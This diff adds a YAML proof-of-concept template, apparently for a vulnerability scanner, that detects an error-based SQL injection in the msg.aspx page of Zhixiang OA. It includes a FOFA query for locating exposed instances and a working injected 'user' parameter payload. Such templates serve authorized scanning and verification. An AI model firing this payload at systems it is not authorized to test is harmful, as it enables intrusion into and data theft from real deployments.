@@ -1,0 +1,16 @@
+id: poc-yaml-zxoa-msg-aspx-sqli
+info:
+  name: 致翔OA msg.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致翔OA
+  fofa: app="致翔软件-致翔OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /mainpage/msg.aspx?user=1'%20and%20(SELECT%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}')))=1%20and%20'1'='1
+  expression: "status_code == 500 && \ncontains(body,\"nvarchar\") &&\ncontains(body,t2)\n"
+transport: http
